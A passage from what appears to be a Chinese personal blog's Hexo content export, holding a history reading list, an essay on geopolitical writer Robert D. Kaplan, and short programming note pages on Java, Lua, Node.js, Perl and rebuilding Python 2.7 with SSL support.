<li><a href="https://riboseyim.github.io/2017/04/20/MrTanSitong/" target="_blank" rel="noopener">清史-同治光绪时期：谭嗣同</a></li>
</ul>
<h2 id="五、明史"><a href="#五、明史" class="headerlink" title="五、明史"></a>五、<a href="https://riboseyim.github.io/2017/06/25/History-Ming/" target="_blank" rel="noopener">明史</a></h2><ul>
<li><a href="http://www.jianshu.com/p/b2bc9871d129" target="_blank" rel="noopener">黄仁宇:《万历十五年》</a></li>
<li><a href="http://www.jianshu.com/p/8376f08e6b90" target="_blank" rel="noopener">黄仁宇:《放宽历史的视界》</a></li>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/" target="_blank" rel="noopener">黄仁宇:《明代的漕运》</a></li>
<li><a href="#">文艺作品|小说《明朝那些事》</a></li>
<li><a href="#">文艺作品|《大明王朝1956》</a>：政府财政逻辑</li>
<li><a href="https://riboseyim.github.io/2017/06/25/MrLizicheng/" target="_blank" rel="noopener">明史：李自成</a></li>
</ul>
<h2 id="六、宋元史"><a href="#六、宋元史" class="headerlink" title="六、宋元史"></a>六、宋元史</h2><ul>
<li><a href="#">国立台湾大学历史系：方震华</a><br>Power Structures and Cultural Identities in Imperial China: Civil and Military Power from Late Tang to Early Song Dynasties (A.D.875-1063).Saarbrücken：VDM Verlag Dr. Müller, 2009.11.</li>
</ul>
<h2 id="七、唐史"><a href="#七、唐史" class="headerlink" title="七、唐史"></a>七、<a href="https://riboseyim.github.io/2018/01/07/History-Tang/" target="_blank" rel="noopener">唐史</a></h2><h2 id="专题"><a href="#专题" class="headerlink" title="专题"></a>专题</h2><h4 id="秦晖-公开课《农民学与中国传统社会专题》"><a href="#秦晖-公开课《农民学与中国传统社会专题》" class="headerlink" title="秦晖 | 公开课《农民学与中国传统社会专题》"></a><a href="#">秦晖 | 公开课《农民学与中国传统社会专题》</a></h4><blockquote>
<p>要点：雇农、地主、衣冠户、流民、土寇与流寇、土地改革与组织资源、苏俄集体化、统购统销与粮食危机</p>
</blockquote>
<h4 id="国立台湾大学历史系：方震华-公开课《战争之外的军事史》"><a href="#国立台湾大学历史系：方震华-公开课《战争之外的军事史》" class="headerlink" title="国立台湾大学历史系：方震华 | 公开课《战争之外的军事史》"></a><a href="#">国立台湾大学历史系：方震华 | 公开课《战争之外的军事史》</a></h4><blockquote>
<p>要点：府兵制（兵农合一）之发生、源流及证伪，破除迷信、大有裨益。</p>
</blockquote>
<h2 id="古人类"><a href="#古人类" class="headerlink" title="古人类"></a>古人类</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/fVvsK_anmymsk8vqHUL2tg" target="_blank" rel="noopener">自闭症不仅造就天才，还可能左右了人类进化 | Time and Mind 论文推荐 | 2016-12-04 科研圈</a><br>对细节的高度观察力（识别不同的植物或动物）和对体系优越的理解力（比如猎物的行为）和异于常人的专注度</li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>History</tag>
      </tags>
  </entry>
  <entry>
    <title>行走的思想家:罗伯特·D.卡普兰</title>
    <url>/2019/03/17/International-Relations-Kaplan/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>公众的观点</li>
<li>战地记者：冒险者的游戏</li>
<li>旅行者：超越时空的智慧</li>
</ul>
<span id="more"></span>
<p>罗伯特·D.卡普兰（1952年生于纽约），新美国安全中心（CNAS）高级研究员，著名地缘政治分析家。卡普兰长期为《大西洋月刊》《纽约时报》《华盛顿邮报》《新共和》《华尔街日报》《国际利益》等媒体撰写评论，也曾被《外交政策》杂志评为全球100大思想家之一。主要作品有《地理的报复》《巴尔干之魂：历史之旅》《东进鞑靼大地》《帝国最前线》《季风：印度洋与美国权力的未来》《即将到来的无政府状态：打破冷战后的梦想》《亚洲熔炉：南海和太平洋稳定局势的终结》等。</p>
<h2 id="公众的观点"><a href="#公众的观点" class="headerlink" title="公众的观点"></a>公众的观点</h2><p>第一次了解卡普兰是通过一本很有意思的小册子 ——《武士政治》(Warrior Politics)。</p>
<p>这本小册子完全可以算是粗糙的出版物：翻译成中文的篇幅也就13万字而已，却杂糅了丘吉尔、孙武、李维、马基雅维利、康德等人的思想，叙事空间从二次世界大战到古罗马，再兜回东方战国时代。尽管如此，因为作者极具个性的解读而难掩其中的远见卓识。</p>
<blockquote>
<p>李维引用费边的话说：“不要在意他们是否把你的谨慎当做胆怯，把你的智慧当做懒惰，把你的慷慨当做软弱；一个明智的敌人害怕你要好过一群愚蠢的朋友夸赞你。李维由此提醒我们，公众的观点一一也就是你身边人的聒噪一一常常是错的。</p>
</blockquote>
<p>既然公众的观点常常是错的，我们又应该以何种方式获得对这个世界的认识呢?</p>
<p>2018年,当地时间11月30日美国第41任总统老布什(George Herbert Walker Bush)逝世，享年94岁。由于老布什生前曾担任”驻华大使”（美国驻中华人民共和国北京联络处主任），中国媒体一时之间纷纷转载了《解放日报》早年刊登过的老照片：</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E4%BA%BA%E7%89%A9%E7%85%A7-%E8%80%81%E5%B8%83%E4%BB%80-%E8%8A%AD%E8%8A%AD%E6%8B%89.png" alt="1974年，时任美国驻京办主任老布什与他的妻子芭芭拉"></p>
<p>中国人民的老朋友、时任美国驻京办主任的老布什期间经常与妻子骑自行车在北京的大街小巷穿行。他经常和妻子骑着自行车穿行于北京的胡同，由于当年外宾稀少，他们曾引起中国老百姓的关注和围观。后来老布什坦承，他之所以整天在北京街头骑车，是因为那时中国政治斗争激烈，他经常“无人搭理”；但这种独特的体验却让他受益匪浅，“<strong>每天都有新的发现</strong>”。</p>
<p>“在当时，我不能去中国家庭，很难接触到当地人。” 于是他向路人发拍立得照片，或者去商店和服务员搭讪，傍晚遛狗以慢慢深入中国普通百姓的生活。老布什还记得曾经带着他的老妈妈骑车逛北京，当停下来等红灯时，“人们就这样瞪着我，看着老妈妈，他们觉得不可思议。”</p>
<p>人类很容易 “把生动性当标准（Vividness Criterion）”， 人们认为亲身经历过或极为熟悉的事情要比那些不太熟悉的事情更重要。通过旅行的方式——大量的直接接触陌生的地域、人群和文化，可以强化我们对客观世界的主观感受，恰恰是修正易得性偏差（Availability bias）的最佳方式。</p>
<blockquote>
<p>我希望真正通过自己的眼睛，去看看真实的中国是什么样的。—— George H. W. Bush</p>
</blockquote>
<h2 id="超越时空的智慧"><a href="#超越时空的智慧" class="headerlink" title="超越时空的智慧"></a>超越时空的智慧</h2><p>相较于老布什总统只是偶尔栖身于一个贫穷帝国的首都而言，卡普兰是一个货真价实的著名战地记者。</p>
<p>从 1975 年起，卡普兰有长达 16 年的时间是在海外度过。他游历阿拉伯和地中海世界，在希腊和葡萄牙生活 9 年之久。直至现在，他已游历了近 70 个国家。世界上哪里有天灾人祸，哪里就有他的身影。他非常自信地认为，真正的新闻并不在白宫，而是在远离白宫的那些不毛之地。他热衷于探索那些兵荒马乱的地方：索马里、卢旺达、阿富汗、刚果、巴尔干地区等。</p>
<p>正因为这样的独特经历，他是20世纪80年代第一个对巴尔干地区即将发生的剧变发出警告的美国作家。卡普兰还曾在以色列国防军服役一年（注：关于这段服役经历没有看到详细描述，很有可能是加入了以色列军事情报局（阿曼，Aman），军情局下面的情报分析处专门负责分析各种情报，尤其观察各恐怖组织的动向等）。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E4%BA%BA%E7%89%A9%E7%85%A7-%E4%BB%A5%E8%89%B2%E5%88%97%E5%9B%BD%E9%98%B2%E5%86%9B.jpeg" alt="现代/以色列国防军女兵"></p>
<p>从事新闻报道之外，卡普兰长期为美国安全部门提供咨询服务。他是美国陆军特种部队，美国海军陆战队和美国空军的顾问，在2006 - 2008年，卡普兰在安纳波利斯海军学院教授题为“未来全球安全挑战”课程。也曾在战争学院，联邦调查局，中央情报局，国家安全局，国防部和参谋长联席会议和商业论坛上发表演讲。2002年，他被美国国务院授予“杰出公共服务奖 the United States State Department Distinguished Public Service Award.”。</p>
<blockquote>
<p>看一下现在的世界地图，上面绘制着190多个国家，每个国家都由醒目而风格统一的颜色来标示：我们每个人从小到大都看过的这张地图，基本上是现代主义的发明，特别是欧洲殖民主义。我这里所说的现代主义是随着欧洲民族国家的产生而出现的，并被三十年战争结束时封建主义的终结所确立。这场战争发生的时间处于文艺复兴和启蒙运动之间，二者是现代科学的起源。人们突然非常热衷于对事物进行范畴化，进行界定。基于科学测量技术的地图提供了对新的国家体系进行分类的方式，将条条块块拼接成七巧板，中间没有任何过渡地带。“国界”本身就是一个现代概念，在封建时代人们的脑海里并不存在“国界”概念。随着欧洲国家的开疆扩土以及印刷术的推广，地图再生产变得便宜，地图制图学逐渐成为一种创造事实的方法，规定了人们看待世界的方式。<br>—— 罗伯特·D.卡普兰 | 《无政府时代的来临》</p>
</blockquote>
<p>在古往今来诸多思想家中，我相信卡普兰心目中真正的精神偶像是温斯顿·丘吉尔。</p>
<p>他们都在追求一种将冒险、旅行、写作融为一体的生活方式，或者说冒险本身就是他们这种人的思考方式之一。</p>
<blockquote>
<p>我们这些年轻军官多么羡慕资深的少校在阿布科里战役中冒险的经历啊！我们又是多么羡慕上校获得的一长排荣誉勋章啊！他们不止一次给我们讲述他们以前激动人心的经历，我们百听不厌。我们多么希望也能有类似的记忆匣子，如果需要的话，可以向一群意气相投的观众一遍一遍地打开陈列。—— 温斯顿·S·丘吉尔 |《丘吉尔传·我的青春》p81</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/IMG_0298.png" alt="人物照：温斯顿·丘吉尔"></p>
<blockquote>
<p>在印度边境打仗本身就是一种难得的经理。……当地的帕坦人总是战事不断，不是各种私人间的争斗，就是公共的战争。除了收获的季节，因为生存的需要，他们才会暂时休战。在这里，每个人既是勇士，又是政治家和神学家。每一幢大的房子都是一个堡垒……每个村子都有自己的防御工事，每个家庭都有自己的家族世仇，每个宗族也都有自己的世仇，数不清的部落和各种各样的部落联合体相互之间都有许多仇恨的账需要清算；没有什么是可以遗忘的，每一笔账都要算清楚。温斯顿·S·丘吉尔 |《丘吉尔传·我的青春》p147</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Map-1918-%E4%B8%96%E7%95%8C%E4%BA%BA%E5%8F%A3%E5%88%86%E5%B8%83.png" alt="1918年世界人口分布图"></p>
<blockquote>
<p>丘吉尔早就看透了希特勒，因为丘吉尔对魔鬼的熟知程度非张伯伦所能及。张伯伦的现实主义是浅薄的。他知道人民需要和平，人民要把钱花在国内需求上而不是在武备上，所以他把那些东西给了人民。但是丘吉尔知道的更多。他是一个很少幻想的人，部分原因是他把时间——在他的学生时代之后——用于阅读历史和写作历史，而且他作为士兵和记者亲历了英国的殖民战争。因此，他知道人类是多么强悍和多么无理性。像所有明智的人一样，他朝着悲剧的方向思考：我们创造道德标准是为了衡量我们自己的缺陷。—— 罗伯特·D·卡普兰 | 《武士政治》p020</p>
</blockquote>
<h2 id="主要作品"><a href="#主要作品" class="headerlink" title="主要作品"></a>主要作品</h2><p>《纽约时报》专栏作家托马斯·弗里德曼称他为“后冷战时代至关重要、值得受到广泛关注的四位作家之一”。</p>
<h5 id="《武士政治》"><a href="#《武士政治》" class="headerlink" title="《武士政治》"></a>《武士政治》</h5><ul>
<li><a href="https://book.douban.com/subject/25872374/comments/">豆瓣|《武士政治》</a></li>
</ul>
<p>作者罗伯特•D.卡普兰认为，这个世界既不是现代的，也不是后现代的，而是古代的延续。因此，在本书中，他从孙子、修昔底德、马基雅维里、霍布斯等人的永恒著作中汲取智慧，告诉今天的领导人如何在政治水域中破浪前行。</p>
<h5 id="《季风：印度洋与美国权力的未来》"><a href="#《季风：印度洋与美国权力的未来》" class="headerlink" title="《季风：印度洋与美国权力的未来》"></a>《季风：印度洋与美国权力的未来》</h5><ul>
<li><a href="https://book.douban.com/subject/24882634/">豆瓣|《季风：印度洋与美国权力的未来》|中国社会科学文献出版社</a></li>
</ul>
<p>作者做了大量田野调查考察环印度洋地区的地缘政治。在此过程中作者发现，虽然各国、各人关于权力平衡的视角和观点不尽相同，但一个共识是中国和印度是该地区新兴的力量。随着中印的崛起，各自均要保证“原材料通道的安全”。为验证此假说，作者借鉴了历史学和权力平衡理论的若干观点，并从现实地缘上考察了“阿曼—巴基斯坦—缅甸—印尼” 对原材料运输线的意义，以及可能威胁海洋航线的要素，诸如海盗、种族冲突、或对马六甲海峡的恶意控制。</p>
<h5 id="《巴尔干鬼魂》（Balkan-Ghosts）"><a href="#《巴尔干鬼魂》（Balkan-Ghosts）" class="headerlink" title="《巴尔干鬼魂》（Balkan Ghosts）"></a>《巴尔干鬼魂》（Balkan Ghosts）</h5><ul>
<li>《纽约时报书评》年度最佳图书</li>
<li><a href="https://book.douban.com/subject/30288944/">豆瓣|《巴尔干两千年》|北京大学出版社</a></li>
</ul>
<p>巴尔干半岛为什么会被称为“欧洲桶”？为什么这个地区会成为欧洲为动荡的地方？地缘学家在游历巴尔干诸国的深沉旅行中，回顾了巴尔干地区的漫长历史，以深刻的洞察力、以冷静犀利的纪实笔触，呈现了这一地区复杂的历史变迁和民族关系以及背后大国势力的竞相角力，从奥斯曼征服到科索沃战争，巴尔干一直扮演着欧亚政治版图变化的重要力量。</p>
<h5 id="《阿拉伯专家》（-The-Arabists）"><a href="#《阿拉伯专家》（-The-Arabists）" class="headerlink" title="《阿拉伯专家》（ The Arabists）"></a>《阿拉伯专家》（ The Arabists）</h5><ul>
<li>《纽约时报》年度最值得阅读的图书</li>
<li>《华尔街日报》关于美国与中东地区历史关系的五本必读书目之一</li>
</ul>
<h5 id="《地球边缘》（The-Ends-of-the-Earth）"><a href="#《地球边缘》（The-Ends-of-the-Earth）" class="headerlink" title="《地球边缘》（The Ends of the Earth）"></a>《地球边缘》（The Ends of the Earth）</h5><ul>
<li>《纽约时报》年度最值得阅读的图书</li>
</ul>
<h5 id="《荒野帝国：走入美国未来的旅行》（-An-Empire-Wilderness-Travels-into-America’s-Future）"><a href="#《荒野帝国：走入美国未来的旅行》（-An-Empire-Wilderness-Travels-into-America’s-Future）" class="headerlink" title="《荒野帝国：走入美国未来的旅行》（ An Empire Wilderness: Travels into America’s Future）"></a>《荒野帝国：走入美国未来的旅行》（ An Empire Wilderness: Travels into America’s Future）</h5><ul>
<li>《纽约时报》年度最值得阅读的图书</li>
<li>《华盛顿邮报》年度最佳图书</li>
<li>《洛杉矶时报》年度最佳图书</li>
</ul>
<p>1995—1997年，卡普兰在故土美国及周边开始了一场旅行，从堪萨斯走到西海岸，从中部的密苏里走到西部的俄勒冈，从北部的加拿大边境走到南部的墨西哥。透过政治与文化的视角，卡普兰发现了一个转变中的美国——一个在种族、阶层、教育、地理上充满了区隔和断裂的美国。这里，财富在迅速增加，但贫富差距也在进一步拉大；传统的信念已经消逝，而新的信念仅仅处于萌芽状态。这个大国并非衰落，而是正在缓慢而不可逆转地蜕变出一种全新的身份认同。</p>
<h5 id="《即将到来的地缘战争》-The-Revenge-of-Geography）"><a href="#《即将到来的地缘战争》-The-Revenge-of-Geography）" class="headerlink" title="《即将到来的地缘战争》(The Revenge of Geography）"></a>《即将到来的地缘战争》(The Revenge of Geography）</h5><ul>
<li>原作名: The Revenge of Geography:What the Map Tells Us About Coming Conflicts and the Battle Against</li>
<li>副标题: 无法回避的大国冲突及对地理宿命的抗争</li>
<li><a href="https://book.douban.com/subject/24696402/">豆瓣|《即将到来的地缘战争》|广东人民出版社</a></li>
</ul>
<p>卡普兰在本书中以地理为主线。通过对气候、地势和地理位置的考察，卡普兰回顾和分析了欧洲、俄罗斯、中国、印度、土耳其、伊朗和中东等地的历史热点和潜在危机，并全面地预测了欧亚大陆的下一个冲突周期。</p>
<h5 id="《东进鞑靼大地》（Eastward-to-Tartary）"><a href="#《东进鞑靼大地》（Eastward-to-Tartary）" class="headerlink" title="《东进鞑靼大地》（Eastward to Tartary）"></a>《东进鞑靼大地》（Eastward to Tartary）</h5><ul>
<li>《纽约时报》年度最值得阅读的图书</li>
</ul>
<h5 id="《战之华》（Warrior-Politics）"><a href="#《战之华》（Warrior-Politics）" class="headerlink" title="《战之华》（Warrior Politics）"></a>《战之华》（Warrior Politics）</h5><ul>
<li>《纽约时报》年度最值得阅读的图书</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="http://riboseyim.github.io/2019/02/10/Psychology-Biases/">情绪的动物：认知、偏见与决策</a></li>
<li><a href="https://riboseyim.github.io/2019/03/17/International-Relations-Kaplan/">行走的思想家：罗伯特·D.卡普兰</a></li>
<li><a href="https://riboseyim.com/2019/02/04/Engineering-Ethics/">国之重器，在人不在宝 | 挑战者号航天飞机事故调查</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/">红楼故事：康熙的秘密情报系统</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://cul.qq.com/a/20150805/026828.htm">罗伯特·D.卡普兰：制图者们的谎言 | 腾讯文化 | 2015-08-05 </a></li>
<li><a href="http://www.traveler.com.cn/traveler/index.php/jplm/classic/726-dlsljyqdsd">罗伯特•D•卡普兰:地理是理解一切的开端 | 旅行家（2015年2月刊）</a></li>
<li><a href="https://www.guancha.cn/LuoBoTe-D-KaPuLan/2014_09_17_268194.shtml">罗伯特·D·卡普兰：土耳其的地缘雄心</a></li>
<li><a href="https://www.guancha.cn/LuoBoTe-D-KaPuLan/2018_03_23_451213.shtml">罗伯特·卡普兰：帝国的陷阱与威权主义</a></li>
</ul>
]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>Travel</tag>
        <tag>Intelligence</tag>
      </tags>
  </entry>
  <entry>
    <title>Language-Java-lang</title>
    <url>/2019/01/07/Language-Java-lang/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="JVM-性能分析与优化"><a href="#JVM-性能分析与优化" class="headerlink" title="JVM 性能分析与优化"></a>JVM 性能分析与优化</h2><ul>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Uber 开源 Java 分布式应用追踪工具：JVM Profiler</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Works-Memory/" target="_blank" rel="noopener">操作系统原理 | How Linux Works（三）：内存管理</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>Language-Lua-lang</title>
    <url>/2018/08/23/Language-Lua-lang/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Introduction-Lua-简介"><a href="#Introduction-Lua-简介" class="headerlink" title="Introduction | Lua 简介"></a>Introduction | Lua 简介</h2><h2 id="Core-Concept-核心概念"><a href="#Core-Concept-核心概念" class="headerlink" title="Core Concept | 核心概念"></a>Core Concept | 核心概念</h2><h4 id="Concept-A"><a href="#Concept-A" class="headerlink" title="Concept A"></a>Concept A</h4><h4 id="Concept-B"><a href="#Concept-B" class="headerlink" title="Concept B"></a>Concept B</h4><h4 id="Concept-C"><a href="#Concept-C" class="headerlink" title="Concept C"></a>Concept C</h4><h2 id="Architecture-Lua-架构"><a href="#Architecture-Lua-架构" class="headerlink" title="Architecture | Lua 架构"></a>Architecture | Lua 架构</h2><h2 id="Best-Practice-Lua-最佳实践"><a href="#Best-Practice-Lua-最佳实践" class="headerlink" title="Best Practice | Lua 最佳实践"></a>Best Practice | Lua 最佳实践</h2><ul>
<li>Redis Monitor with Lua</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/26/Language/" target="_blank" rel="noopener">玩转编程语言系列</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://blog.codingnow.com/2018/08/luavm_bootstrap.html" target="_blank" rel="noopener">Lua 虚拟机封装</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>玩转编程语言:Node.js</title>
    <url>/2017/05/16/Language-Node-lang/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li><a href="https://riboseyim.github.io/2017/12/21/Language-Auto-Generator/" target="_blank" rel="noopener">玩转编程语言:构建自定义代码生成器</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/" target="_blank" rel="noopener">Machine Learning (二) : 宠物智能识别之 Using OpenCV with Node.js</a></li>
</ul>
<a id="more"></a>
<h2 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h2><h4 id="1-Blog-amp-Code-Generator"><a href="#1-Blog-amp-Code-Generator" class="headerlink" title="1. Blog &amp; Code Generator"></a>1. Blog &amp; Code Generator</h4><ul>
<li><a href="https://riboseyim.github.io/2017/06/03/Writing-WriterToolChain/" target="_blank" rel="noopener">我的写作工具链</a></li>
<li><a href="https://riboseyim.github.io/2017/12/21/Language-Auto-Generator/" target="_blank" rel="noopener">玩转编程语言:构建自定义代码生成器</a></li>
</ul>
<h4 id="2-远程通信协议：从-CORBA-到-gRPC"><a href="#2-远程通信协议：从-CORBA-到-gRPC" class="headerlink" title="2. 远程通信协议：从 CORBA 到 gRPC"></a>2. <a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/" target="_blank" rel="noopener">远程通信协议：从 CORBA 到 gRPC</a></h4><ul>
<li>一、远程调用技术简史:从 CORBA 到 gRPC</li>
<li>二、gRPC 简介</li>
<li>三、gRPC 示例代码</li>
</ul>
<h4 id="3-GraphQL"><a href="#3-GraphQL" class="headerlink" title="3. GraphQL"></a>3. GraphQL</h4><ul>
<li><a href="http://taobaofed.org/blog/2015/11/26/graphql-basics-server-implementation/" target="_blank" rel="noopener">Node.js 服务端实践之 GraphQL 初探 | 淘宝前端团队FED</a></li>
<li><a href="https://graphqlme.com/2017/11/11/build-better-graphql-apis-thinking-in-graphs/" target="_blank" rel="noopener">Build Better GraphQL APIs: Thinking In Graphs | November 11, 2017</a></li>
</ul>
<h4 id="4-Machine-Learning"><a href="#4-Machine-Learning" class="headerlink" title="4. Machine Learning"></a>4. Machine Learning</h4><ul>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/" target="_blank" rel="noopener">Machine Learning (二) : 宠物智能识别之 Using OpenCV with Node.js</a></li>
</ul>
<h3 id="ABC"><a href="#ABC" class="headerlink" title="ABC"></a>ABC</h3><ul>
<li>module manage<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">YRMacBook-Pro:Node yanrui$ node</span><br><span class="line">&gt; console.log(module);</span><br><span class="line">Module &#123;</span><br><span class="line">  id: &apos;&lt;repl&gt;&apos;,</span><br><span class="line">  exports: &#123;&#125;,</span><br><span class="line">  parent: undefined,</span><br><span class="line">  filename: null,</span><br><span class="line">  loaded: false,</span><br><span class="line">  children: [],</span><br><span class="line">  paths:</span><br><span class="line">   [ &apos;/Users/yanrui/project/gRPC/Client/Node/repl/node_modules&apos;,</span><br><span class="line">     &apos;/Users/yanrui/project/gRPC/Client/Node/node_modules&apos;,</span><br><span class="line">     &apos;/Users/yanrui/project/gRPC/Client/node_modules&apos;,</span><br><span class="line">     &apos;/Users/yanrui/project/gRPC/node_modules&apos;,</span><br><span class="line">     &apos;/Users/yanrui/project/node_modules&apos;,</span><br><span class="line">     &apos;/Users/yanrui/node_modules&apos;,</span><br><span class="line">     &apos;/Users/node_modules&apos;,</span><br><span class="line">     &apos;/node_modules&apos;,</span><br><span class="line">     &apos;/Users/yanrui/.node_modules&apos;,</span><br><span class="line">     &apos;/Users/yanrui/.node_libraries&apos;,</span><br><span class="line">     &apos;/usr/local/Cellar/node/7.10.0/lib/node&apos; ] &#125;</span><br><span class="line">&gt; process.exit();</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><ul>
<li><a href="https://www.tecmint.com/nvm-install-multiple-nodejs-versions-in-linux/#" target="_blank" rel="noopener">NVM – Install and Manage Multiple Node.js Versions in Linux</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/26/Language/" target="_blank" rel="noopener">玩转编程语言系列</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.ruanyifeng.com/blog/2016/01/npm-install.html" target="_blank" rel="noopener">npm 模块安装机制简介</a></li>
<li><a href="https://hackernoon.com/using-redis-with-node-js-8d87a48c5dd7" target="_blank" rel="noopener">Using Redis with Node JS</a></li>
<li><a href="https://dexecure.com/blog/how-to-create-http2-static-file-server-nodejs-with-examples/" target="_blank" rel="noopener">How to create a zero dependency HTTP/2 static file server with Node.js (with examples)</a></li>
<li><a href="https://blog.sessionstack.com/how-javascript-works-the-rendering-engine-and-tips-to-optimize-its-performance-7b95553baeda" target="_blank" rel="noopener">How JavaScript works: the rendering engine and tips to optimize its performance</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Developer</tag>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>玩转编程语言:Perl</title>
    <url>/2017/05/16/Language-Perl-lang/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><ul>
<li>/usr/bin/perl^M: bad interpreter</li>
</ul>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#### get rid of ^M with</span></span><br><span class="line">dos2unix /usr/<span class="keyword">local</span>/bin/sr_server</span><br><span class="line">perl -pi -e <span class="string">'tr[\r][]d'</span> /usr/<span class="keyword">local</span>/bin/sr_server</span><br></pre></td></tr></table></figure>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/26/Language/" target="_blank" rel="noopener">玩转编程语言系列</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>玩转编程语言:Python</title>
    <url>/2017/06/19/Language-Python-lang/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="ABC"><a href="#ABC" class="headerlink" title="ABC"></a>ABC</h2><ul>
<li><a href="https://github.com/learnbyexample/Python_Basics" target="_blank" rel="noopener">Learn By Example:Python Basics</a></li>
</ul>
<h2 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h2><h4 id="远程通信协议：从-CORBA-到-gRPC"><a href="#远程通信协议：从-CORBA-到-gRPC" class="headerlink" title="远程通信协议：从 CORBA 到 gRPC"></a><a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/" target="_blank" rel="noopener">远程通信协议：从 CORBA 到 gRPC</a></h4><ul>
<li>一、远程调用技术简史:从 CORBA 到 gRPC</li>
<li>二、gRPC 简介</li>
<li>三、gRPC 示例代码</li>
</ul>
<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><h4 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h4><ul>
<li>升级 Python 2.7 提示缺少 SSL 模块</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> ssl</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">File <span class="string">"/usr/local/python27/lib/python2.7/ssl.py"</span>, line <span class="number">60</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"><span class="keyword">import</span> _ssl <span class="comment"># if we can't import it, let the error propagate</span></span><br><span class="line">ImportError: No module named _ssl</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>vi /src/Python-2.7.15/Modules/Setup</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Socket module helper for socket(2)</span></span><br><span class="line">_socket socketmodule.c timemodule.c</span><br><span class="line"><span class="comment"># Socket module helper for SSL support; you must comment out the other</span></span><br><span class="line"><span class="comment"># socket line above, and possibly edit the SSL variable:</span></span><br><span class="line"><span class="comment">#SSL=/usr/local/ssl</span></span><br><span class="line">_ssl _ssl.c \</span><br><span class="line">-DUSE_SSL -I$(SSL)/include -I$(SSL)/include/openssl \</span><br><span class="line">-L$(SSL)/lib -lssl -lcrypto</span><br></pre></td></tr></table></figure>
<ul>
<li>重新编译</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /src/Python-2.7.15/</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure>
<ul>
<li>测试验证</li>
</ul>
